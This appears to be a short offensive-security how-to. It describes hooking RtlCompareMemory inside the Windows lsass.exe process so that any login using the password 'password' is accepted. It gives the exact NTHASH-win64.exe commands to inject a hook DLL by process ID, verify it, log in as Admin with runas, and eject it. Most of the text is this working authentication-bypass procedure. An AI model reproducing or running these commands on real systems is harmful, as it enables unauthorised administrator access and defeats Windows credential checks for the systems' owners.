For fun and (no) profit : lets hook rtlcomparememory in lsass.exe.
Indeed, at some point, windows will need to compare of a (md4) hash of your provided password with the hash of the password in the sam local db.
So lets hook rtlcomparememory, and if 'password' (or rather the md4 hash) is provided, then lets return "true" !.

NTHASH-win64.exe /inject /pid:808 /binary:c:\temp\hook-win64.dll

optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .

runas /user:Admin cmd (provide "password" here as password)

NTHASH-win64.exe /eject /pid:808 /binary:hook-win64.dll

optionally, check that our dll as been ejected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .
